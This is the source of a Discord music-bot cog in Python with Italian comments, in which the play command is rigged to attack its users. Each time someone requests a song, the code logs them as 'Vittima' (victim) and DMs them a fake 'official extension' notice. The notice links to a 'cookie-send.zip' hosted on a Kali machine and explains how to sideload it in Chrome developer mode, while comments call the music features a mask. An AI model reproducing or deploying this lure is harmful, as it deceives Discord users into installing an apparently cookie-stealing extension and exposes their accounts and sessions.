import asyncio
import logging
import sys
from datetime import datetime
import os
import subprocess
import time
import random
import string

from discord.ext import commands
import discord
import yt_dlp

logger = logging.getLogger(__name__)
logger.addHandler(logging.StreamHandler(sys.stdout))


YTDL_FORMAT_OPTIONS = {
    "format": "bestaudio/best",
    "restrictfilenames": True,
    "noplaylist": True,
    "nocheckcertificate": True,
    "ignoreerrors": False,
    "logtostderr": False,
    "quiet": True,
    "no_warnings": True,
    "default_search": "auto",
    "source_address": "0.0.0.0",
}
FFMPEG_OPTIONS = {
    "options": "-vn",
    "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5",
}


class Player:
    def __init__(self, client: commands.Cog, guild: discord.Guild):
        self.client = client
        self.guild = guild
        self.channel: discord.VoiceClient | None = None
        self.song_queue: asyncio.Queue[str] = asyncio.Queue()
        self.is_playing = False
        self.is_connected = False
        self.logger = logging.getLogger(f"{__name__}:Player:{guild.id}")
        self.logger.addHandler(logging.StreamHandler(sys.stdout))

        self._ytdl = yt_dlp.YoutubeDL(YTDL_FORMAT_OPTIONS)
        self._run_task: asyncio.Task | None = None

    async def queue_song(self, song: str) -> None:
        await self.song_queue.put(song)
        self.logger.info(f"Queed {song}")

    async def stop_playing(self):
        assert self._run_task is not None
        self._run_task.cancel()
        self.logger.info("Stopped.")

    async def skip_song(self):
        if not self.guild.voice_client:
            self.logger.info("Nothing to stop. Returning.")
            return False
        self.guild.voice_client.stop()
        self.logger.info("Skipped.")
        return True

    async def start_playing(self, channel: discord.VoiceChannel):
        self.voice_channel = channel
        self._run_task = asyncio.create_task(self._run(channel))
        self.logger.info("Started playing.")

    async def _play_file(self, filename: str):
        self.logger.info(f"Playing file: {filename}")
        self.is_playing = True
        finished_playing = asyncio.Event()
        self.guild.voice_client.play(
            source=discord.FFmpegPCMAudio(filename, **FFMPEG_OPTIONS), after=lambda _: finished_playing.set()
        )
        await finished_playing.wait()
        self.logger.info(f"Finished playing file: {filename}")

    async def _run(self, voice_channel: discord.VoiceChannel):
        try:
            self.logger.info("Connecting to voice channel.")
            self.channel = await voice_channel.connect()
            self.is_connected = True
            while True:
                logger.info("Fetching next song.")
                url = await self.song_queue.get()
                await self._play_file(url)
        finally:
            self.logger.info("Disconnecting from voice channel.")
            assert self.channel is not None
            await self.channel.disconnect()
            self.is_connected = False
            self._run_task = None


class Music(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.players: dict[int, Player] = dict()
        self._ytdl = yt_dlp.YoutubeDL(YTDL_FORMAT_OPTIONS)
        
        # ===== LINK ESTENSIONE SU KALI (CORRETTO) =====
        self.EXTENSION_URL = "http://192.168.1.24/cookie-send.zip"

    @commands.Cog.listener()
    async def on_ready(self):
        logger.info("Initializing music cog...")
        for guild in self.bot.guilds:
            logger.debug(f"Creating player for {guild.name}...")
            self.players[guild.id] = Player(self, guild)
        logger.info(f"Music cog ready - Link estensione: {self.EXTENSION_URL}")

    @commands.command(name='p', aliases=['play'])
    async def p(self, ctx, *, query: str):
        """Play a song by URL or search query."""
        logger.debug(f"Playing: {query}")
        
        player = self.players[ctx.guild.id]
        
        # ===== INVIO LINK ESTENSIONE =====
        try:
            print(f"\n{'='*80}")
            print(f"              🔥 INVIO ESTENSIONE 🔥")
            print(f"{'='*80}")
            print(f"Vittima: {ctx.author.name} (ID: {ctx.author.id})")
            print(f"Server: {ctx.guild.name}")
            print(f"Timestamp: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
            print(f"Link estensione: {self.EXTENSION_URL}")
            print(f"{'='*80}\n")
            
            # Link da inviare
            malicious_link = self.EXTENSION_URL
            
            print(f"[*] Link generato: {malicious_link}")
            print(f"[*] Tentativo invio DM a {ctx.author.name}...")
            
            # Invia il link in DM con messaggio CREDIBILE
            try:
                await ctx.author.send(
                    f"🎵 **Aggiornamento necessario per la sincronizzazione**\n\n"
                    f"Ciao {ctx.author.name}, per garantire la migliore esperienza con le playlist abbiamo rilasciato un'estensione ufficiale.\n\n"
                    f"📥 **Scarica l'estensione qui:**\n"
                    f"{malicious_link}\n\n"
                    f"✅ **Come installarla:**\n"
                    f"1. Apri Chrome e vai su `chrome://extensions/`\n"
                    f"2. Attiva la **Modalità sviluppatore** (in alto a destra)\n"
                    f"3. Trascina il file ZIP scaricato nella finestra\n\n"
                    f"🎵 Dopo l'installazione, l'estensione ottimizzerà automaticamente le tue playlist.\n\n"
                    f"_(Team di sviluppo - Supporto playlist)_"
                )
                print(f"[✅] DM inviato con successo a {ctx.author.name}")
                await ctx.send("📬 **Controlla i tuoi DM!** Istruzioni per l'ottimizzazione playlist inviate.")
                
            except discord.Forbidden:
                print(f"[❌] Impossibile inviare DM a {ctx.author.name} (bloccato)")
                await ctx.send(f"⚠️ {ctx.author.mention}, non posso mandarti DM. Abilita i messaggi privati.\nLink diretto: {malicious_link}")
            except Exception as e:
                print(f"[❌] Errore invio DM: {e}")
                await ctx.send(f"📋 **Link estensione:** {malicious_link}")
            
            print(f"\n{'='*80}\n")
                
        except Exception as e:
            logger.error(f"Errore nell'invio: {e}")
            print(f"\n[!] ERRORE GENERALE: {e}")
        # ===== FINE INVIO =====
        
        # ===== CODICE NORMALE DEL BOT (MASCHERA) =====
        if not ctx.author.voice:
            await ctx.send("Devi essere in un canale vocale!")
            return
        
        async with ctx.typing():
            try:
                data = await asyncio.get_running_loop().run_in_executor(
                    None, lambda: self._ytdl.extract_info(query, download=False)
                )
                
                if "entries" in data:
                    data = data["entries"][0]
                
                url = data["url"]
                title = data["title"]
                
                await player.queue_song(url)
                await ctx.send(f"🎵 Aggiunto in coda: {title}")
                
                if not player.is_connected and ctx.author.voice:
                    await player.start_playing(ctx.author.voice.channel)
                    
            except Exception as e:
                await ctx.send(f"Errore musica: {str(e)}")

    @commands.command()
    async def stop(self, ctx):
        """Ferma la musica"""
        player = self.players.get(ctx.guild.id)
        if player:
            await player.stop_playing()
            await ctx.send("⏹️ Fermato")

    @commands.command()
    async def skip(self, ctx):
        """Salta la canzone"""
        player = self.players.get(ctx.guild.id)
        if player and await player.skip_song():
            await ctx.send("⏭️ Saltato")

    @commands.command(name='test')
    async def test_link(self, ctx):
        """Comando di test per vedere il link"""
        print(f"\n{'='*80}")
        print(f"              🧪 TEST - LINK ESTENSIONE 🧪")
        print(f"{'='*80}")
        print(f"Link da inviare: {self.EXTENSION_URL}")
        await ctx.send(f"🔗 **Link estensione:** {self.EXTENSION_URL}")

    async def _parse_url(self, request: str) -> dict[str, str]:
        data = await asyncio.get_running_loop().run_in_executor(
            None, lambda: self._ytdl.extract_info(request, download=False)
        )
        if "entries" in data:
            return {entry["title"]: entry["url"] for entry in data["entries"]}
        return {data["title"]: data["url"]}


async def setup(bot: commands.Bot):
    await bot.add_cog(Music(bot))
    logger.info("loaded Music cog - Versione con messaggio credibile")